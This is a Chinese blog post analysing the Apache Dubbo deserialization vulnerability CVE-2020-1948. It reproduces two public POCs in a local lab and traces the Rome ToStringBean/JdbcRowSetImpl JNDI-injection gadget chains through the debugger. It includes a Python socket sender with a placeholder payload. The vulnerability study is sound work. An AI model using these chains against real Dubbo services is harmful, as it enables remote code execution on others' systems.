<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="为什么会想写这样一篇文章呢，一方面是因为学习安全那么些时间一直没有写点东西，恰好最近在学习Java反序列化的相关知识，于是呢就想着记录一下自己学习的知识。还有一个原因是在学习dubbo两个反序列化漏洞的过程中（CVE-2019-17564、CVE-2020-1948），对于更加复杂的CVE-2020-1948没有找到实际可用的链路分析文章，都是分析了一个很难在实际中遇到的gadget（Rome），">
<meta property="og:type" content="article">
<meta property="og:title" content="dubbo反序列化（CVE-2020-1948）可用链路学习">
<meta property="og:url" content="http://yoursite.com/2021/03/23/dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88CVE-2020-1948%EF%BC%89%E5%8F%AF%E7%94%A8%E9%93%BE%E8%B7%AF%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="自动笔记生成器">
<meta property="og:description" content="为什么会想写这样一篇文章呢，一方面是因为学习安全那么些时间一直没有写点东西，恰好最近在学习Java反序列化的相关知识，于是呢就想着记录一下自己学习的知识。还有一个原因是在学习dubbo两个反序列化漏洞的过程中（CVE-2019-17564、CVE-2020-1948），对于更加复杂的CVE-2020-1948没有找到实际可用的链路分析文章，都是分析了一个很难在实际中遇到的gadget（Rome），">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B18%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B20%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B19%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B21%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B22%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B26%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B27%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B28%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B29%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B30%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B31%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B32%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B33%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B34%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B35%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B38%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B39%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B40%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B44%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B45%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B47%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B51%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B52%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B53%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B54%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B55%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B58%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B59%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B60%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B61%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B62%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B63%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B64%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210324/Image.png">
<meta property="og:image" content="http://yoursite.com/images/210324/Image%20%5B1%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210324/Image%20%5B2%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210324/Image%20%5B3%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210324/Image%20%5B4%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B3%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B35%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B36%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B37%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B38%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B39%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B41%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B20%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B21%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B22%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B23%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B24%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B25%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B26%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B27%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B28%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B29%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B30%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210302/Image%20%5B31%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210305/Image%20%5B3%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210305/Image%20%5B4%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210305/Image%20%5B6%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210305/Image.png">
<meta property="og:image" content="http://yoursite.com/images/210305/Image%20%5B1%5D.png">
<meta property="og:image" content="http://yoursite.com/images/210305/Image%20%5B2%5D.png">
<meta property="article:published_time" content="2021-03-23T12:24:33.000Z">
<meta property="article:modified_time" content="2021-03-26T09:32:29.632Z">
<meta property="article:author" content="0xSky">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/images/210222/dubbo/Image%20%5B18%5D.png">

<link rel="canonical" href="http://yoursite.com/2021/03/23/dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88CVE-2020-1948%EF%BC%89%E5%8F%AF%E7%94%A8%E9%93%BE%E8%B7%AF%E5%AD%A6%E4%B9%A0/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>dubbo反序列化（CVE-2020-1948）可用链路学习 | 自动笔记生成器</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">自动笔记生成器</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/03/23/dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88CVE-2020-1948%EF%BC%89%E5%8F%AF%E7%94%A8%E9%93%BE%E8%B7%AF%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="0xSky">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="自动笔记生成器">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          dubbo反序列化（CVE-2020-1948）可用链路学习
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-23 20:24:33" itemprop="dateCreated datePublished" datetime="2021-03-23T20:24:33+08:00">2021-03-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-03-26 17:32:29" itemprop="dateModified" datetime="2021-03-26T17:32:29+08:00">2021-03-26</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>为什么会想写这样一篇文章呢，一方面是因为学习安全那么些时间一直没有写点东西，恰好最近在学习Java反序列化的相关知识，于是呢就想着记录一下自己学习的知识。还有一个原因是在学习dubbo两个反序列化漏洞的过程中（CVE-2019-17564、CVE-2020-1948），对于更加复杂的CVE-2020-1948没有找到实际可用的链路分析文章，都是分析了一个很难在实际中遇到的gadget（Rome），于是就萌生了自己学习一下实际可用的链路（毕竟难以利用的链路无法打动研发同事，狗头.jpg）。<br>之前在学习时写了三篇流水账，于是此文作为对此次学习的一个总结，梳理一下之前的三篇流水账。有关CVE-2019-17564比较简单，这里就不赘述了，可用直接看第一篇流水账。</p>
<h2 id="CVE-2020-1948基础复现"><a href="#CVE-2020-1948基础复现" class="headerlink" title="CVE-2020-1948基础复现"></a>CVE-2020-1948基础复现</h2><h3 id="第二个POC的复现"><a href="#第二个POC的复现" class="headerlink" title="第二个POC的复现"></a>第二个POC的复现</h3><p>我们首先按照漏洞原作者Ruilin师傅给官方的<a href="https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html" target="_blank" rel="noopener">报告</a>中的两个POC学习一下这个漏洞。<br>首先我们来看第二个POC，为什么是第二个呢，因为第二个POC是通过主动抛出错误时，调用这个错误的构造方法，构造方法接受一个参数时进行拼接从而触发参数对象重写的toString方法达到触发目的，与第一个反序列化POC有着较大的不同，而在dubbo的GitHub issue中争论得最激烈的就是这个toString方法，想了各种方法去修，实际上由于gadget（Rome）其实在一般的项目中并不常用着实有点跑偏了。但是作者在这个POC中的思路着实牛皮下面贴一下复现的过程。</p>
<p>复现时使用的是dubbo-spring-boot-project-0.1.0版本演示项目，目的是使用更多的dubbo版本进行测试，因为dubbo在捐赠给Apache后包名发生了变化，用其他演示项目修改起来非常麻烦。<br>在项目中引入作者的POC触发所需的gadget Rome依赖，同时因为这个漏洞是触发JNDI注入，所以再从GitHub拉一个现成的JNDI Server，这里我使用的是<a href="https://github.com/welk1n/JNDI-Injection-Exploit" target="_blank" rel="noopener">JNDI-Injection-Exploit</a>。有关RMI、JNDI、JRMP的相关知识我这里也不赘述了，网上的师傅们已经有非常详尽的解释了。</p>
<p><img src="/images/210222/dubbo/Image%20%5B18%5D.png" alt=""></p>
<p>启动演示项目与JNDI Server，这里需要注意为了方便实验，我使用的是JRE1.8_131。</p>
<p><img src="/images/210222/dubbo/Image%20%5B20%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B19%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B21%5D.png" alt=""></p>
<p>环境布置完毕后我们运行Ruilin师傅提交的POC，这里犯了个小错误，演示项目的dubbo端口是12345而不是20880。</p>
<p><img src="/images/210222/dubbo/Image%20%5B22%5D.png" alt=""></p>
<p>运行POC后弹出了我们想看到的计算器，JNDI Server也有输出记录（设置JNDI Server 计算器payload的过程我略过了，项目描述文件中有比较详细的描述）。</p>
<p><img src="/images/210222/dubbo/Image%20%5B26%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B27%5D.png" alt=""></p>
<h3 id="第二个POC的利用链路分析"><a href="#第二个POC的利用链路分析" class="headerlink" title="第二个POC的利用链路分析"></a>第二个POC的利用链路分析</h3><p>从上面师傅POC的代码我们可以看到，POC将带有ldap地址的<code>JdbcRowSetImpl</code>封装到<code>ToStringBean</code>中，作为参数对dubbo发起请求。了解了POC所做的事，接下来就进入IDE调试一下。<br>首先查看在payload触发时的错误堆栈。</p>
<p><img src="/images/210222/dubbo/Image%20%5B28%5D.png" alt=""></p>
<p>可以看到在堆栈中有多次<code>toString</code>调用，这里就是触发POC中封装ldap地址的位置，为了符合从外到内的习惯，我在堆栈中<code>DecodeHandler.received</code>处设下断点。<br>这里还有个小坑，如果不关闭IDEA的Enable ‘toString()’ object view选项，就会一直触发payload弹出计算器，因为IDEA为了方便查看会调用object 的toString来方便展示，这就让payload触发了，其实IDEA也是告诉了我们payload触发的位置（笑）。</p>
<p><img src="/images/210222/dubbo/Image%20%5B29%5D.png" alt=""></p>
<p>然后跟着堆栈的调用跟进，这里就是处理请求信息的流程就不过多地解释了，依照堆栈堆栈即可。</p>
<p><img src="/images/210222/dubbo/Image%20%5B30%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B31%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B32%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B33%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B34%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B35%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B38%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B39%5D.png" alt=""></p>
<p>之后再跟进时，在<code>getInvoker</code>方法中由于找不到service会抛出一个<code>RemotingException</code>，这就是在POC中指定一个不存在的service的用意，就是为了触发此处的异常抛出</p>
<p><img src="/images/210222/dubbo/Image%20%5B40%5D.png" alt=""></p>
<p>可以看到在<code>throw new RemotingException</code>时构造方法传参大量使用了加号去拼接对象，这会隐式调用对象的<code>toString</code>方法，要确定触发点也非常简单，在前面的步骤中我们关闭了自动<code>toString</code>，此时我们只要手动一个一个点击对象的<code>toString</code>就可以了（IDEA查看对象就是调用<code>toString</code>）。在点击<code>inv</code>对象时计算器弹出了，这就明确了，进入<code>inv</code>对象类源码。</p>
<p><img src="/images/210222/dubbo/Image%20%5B44%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B45%5D.png" alt=""></p>
<p><code>inv</code>是<code>DecodeableRpcInvocation</code>对象，但在<code>DecodeableRpcInvocation</code>中并没有重写<code>toString</code>，而在<code>DecodeableRpcInvocation</code>的父类<code>RpcInvocation</code>中重写了<code>toString</code>。</p>
<p><img src="/images/210222/dubbo/Image%20%5B47%5D.png" alt=""></p>
<p>而重写的<code>toString</code>方法中将<code>RpcInvocation</code>对象的<code>parameterTypes</code>、<code>arguments</code>、<code>attachements</code>都拼接了这最终导致了参数中的<code>ToStringBean</code>的<code>toString</code>方法被执行，而<code>ToStringBean</code>类则是被构造传入的JNDI ldap payload，到这里就完成了一次JNDI注入成功RCE。<br>这里简单补充一下Rome 1.7.0 中触发JDNI注入的位置，刚刚提到<code>ToStringBean</code>的<code>toString()</code>调用了<code>toString(prefix)</code>，此方法遍历所有<code>Method</code>并<code>invoke</code>调用。</p>
<p><img src="/images/210222/dubbo/Image%20%5B51%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B52%5D.png" alt=""></p>
<p>当<code>Method</code>是<code>getDatabaseMetaData</code>时，触发一个典型的JNDI注入。有关这种触发方式<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">BlackHat</a>议题有详细描述。</p>
<p><img src="/images/210222/dubbo/Image%20%5B53%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B54%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B55%5D.png" alt=""></p>
<h3 id="第一个POC的复现"><a href="#第一个POC的复现" class="headerlink" title="第一个POC的复现"></a>第一个POC的复现</h3><p>说完了第二个POC，我们来说第一个POC，之前说过之所以将第二个POC先说是因为第二个POC较为特殊，而第一个POC则与传统的反序列化漏洞更接近。</p>
<p>老规矩上来先看Ruilin师傅的POC。POC非常简洁，构造数据流，发送。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendEvilObjData</span><span class="params">(sock)</span>:</span> </span><br><span class="line">   payload=<span class="string">"这里是二进制payload数据"</span></span><br><span class="line">   sock.send(payload.decaode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(dip,dport)</span>:</span></span><br><span class="line">   sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">   server_addr = (dip, dport)</span><br><span class="line">   sock.connect(server_addr)</span><br><span class="line">   sendEvilObjData(sock)</span><br><span class="line"></span><br><span class="line">run(<span class="string">"127.0.0.1"</span>,<span class="number">12345</span>)</span><br></pre></td></tr></table></figure>

<p>为了能更好地理解，我们现在演示程序上操作一下，因为0.1.0版本的演示项目运行POC时spring会报错，所以这里我使用高版本spring的dubbo-spring-boot-project-2.7.3进行实验。POC的构造参考了D4ck师傅的<a href="https://www.anquanke.com/post/id/209251" target="_blank" rel="noopener">文章</a>。<br>首先和第二个POC一样我们声明JNDI ldap的地址，然后声明<code>ToStringBean</code>类将ldap地址传入，之后依次构造<code>EqualsBean</code>和<code>HashMap</code>将其组装起来，最后用消费者消费之前声明的service（声明service的过程这里就省略了，可以在官方文档和D4ck师傅的文章中查看）。</p>
<p><img src="/images/210222/dubbo/Image%20%5B58%5D.png" alt=""></p>
<p>然后和先前的验证步骤一样启动ldap服务，生产者与消费者demo即可看到payload触发。 </p>
<p><img src="/images/210222/dubbo/Image%20%5B59%5D.png" alt=""></p>
<p>之后来提取流量数据，打开强大的wireshark，由于项目是本地的所以直接监听回环地址，找到数据包并将其中的数据段复制出来因为是序列化后的对象所以其实数据包中的特征还是很明显的，比较好找，这里处理二进制数据我使用了VSCode的hexdump，当然直接找准位置复制也是可以的。</p>
<p><img src="/images/210222/dubbo/Image%20%5B60%5D.png" alt=""></p>
<p>然后将Ruilin师傅POC中py27的使用方法改为py37，发送POC，弹出计算器。</p>
<p><img src="/images/210222/dubbo/Image%20%5B61%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B62%5D.png" alt=""></p>
<p>这里需要说一下，可能是演示项目的问题，我遇到了版本号不匹配的问题，这会造成POC发送后触发的是前一种报错破解方式而非hessian2反序列化，我看到网上有不少文章将报错触发当成了hessian2反序列化触发，导致以为两个POC都是一个链路。</p>
<p><img src="/images/210222/dubbo/Image%20%5B63%5D.png" alt=""></p>
<p><img src="/images/210222/dubbo/Image%20%5B64%5D.png" alt=""></p>
<h3 id="第一个POC-的利用链路分析"><a href="#第一个POC-的利用链路分析" class="headerlink" title="第一个POC 的利用链路分析"></a>第一个POC 的利用链路分析</h3><p>首先贴一下调用堆栈，从堆栈中我们可以清晰地看到我们组装的<code>ToStringBean</code>、<code>EqualsBean</code>、<code>HashMap</code>三个类，栈顶的<code>toString</code>方法就是第二个POC中的JNDI注入触发位置。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">toString:<span class="number">158</span>, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">toString:<span class="number">129</span>, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">198</span>, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hashCode:<span class="number">180</span>, EqualsBean (com.rometools.rome.feed.impl)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">doReadMap:<span class="number">145</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">126</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2703</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2278</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2080</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2074</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">92</span>, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)</span><br><span class="line">decode:<span class="number">116</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:<span class="number">73</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decodeBody:<span class="number">132</span>, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:<span class="number">122</span>, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:<span class="number">82</span>, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:<span class="number">48</span>, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:<span class="number">90</span>, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)</span><br><span class="line">decodeRemovalReentryProtection:<span class="number">502</span>, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">callDecode:<span class="number">441</span>, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">channelRead:<span class="number">278</span>, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">invokeChannelRead:<span class="number">374</span>, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:<span class="number">360</span>, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:<span class="number">352</span>, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">channelRead:<span class="number">1408</span>, DefaultChannelPipeline$HeadContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:<span class="number">374</span>, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:<span class="number">360</span>, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:<span class="number">930</span>, DefaultChannelPipeline (io.netty.channel)</span><br><span class="line">read:<span class="number">163</span>, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)</span><br><span class="line">processSelectedKey:<span class="number">682</span>, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">processSelectedKeysOptimized:<span class="number">617</span>, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">processSelectedKeys:<span class="number">534</span>, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">run:<span class="number">496</span>, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">run:<span class="number">906</span>, SingleThreadEventExecutor$<span class="number">5</span> (io.netty.util.concurrent)</span><br><span class="line">run:<span class="number">74</span>, ThreadExecutorMap$<span class="number">2</span> (io.netty.util.internal)</span><br><span class="line">run:<span class="number">30</span>, FastThreadLocalRunnable (io.netty.util.concurrent)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>有了调用栈，看这个问题就比较清晰了，输入的数据在经过多次<code>decode</code>调用后来到了<code>DecodeableRpcInvocation</code>对象的<code>decode(Channel,InputStream)</code>方法中，此时就能看到dubbo使用的是自定义的<code>Hessian2ObjectInput</code>，<code>Hessian2ObjectInput</code>重写了<code>readObject</code>方法调用<code>Hessian2Input</code>的<code>readObject(Class)</code>。经过多次<code>readObject</code>调用后来到<code>MapDeserializer.doReadMap</code>处触发POC中构造的<code>map.put</code>。</p>
<p><img src="/images/210324/Image.png" alt=""></p>
<p><img src="/images/210324/Image%20%5B1%5D.png" alt=""></p>
<p><img src="/images/210324/Image%20%5B2%5D.png" alt=""></p>
<p>之后就是POC中构造好的触发链，调用<code>beanHashCode</code>，<code>beanHashCode</code>调用了<code>this.obj.toString().hashCode()</code>此时的<code>This</code>就是<code>ToStringBean</code>。</p>
<p><img src="/images/210324/Image%20%5B3%5D.png" alt=""></p>
<p><img src="/images/210324/Image%20%5B4%5D.png" alt=""></p>
<p>看完第一个POC的利用链，对于第二个POC是怎样巧妙绕过反序列化步骤直接调用<code>toString</code>就有了更好的理解。也能看到官方issue中对于<code>toString</code>的修复争论属实意义不大，那是针对Rome gadget的一种巧劲利用，并不能实际解决问题，本末倒置了。</p>
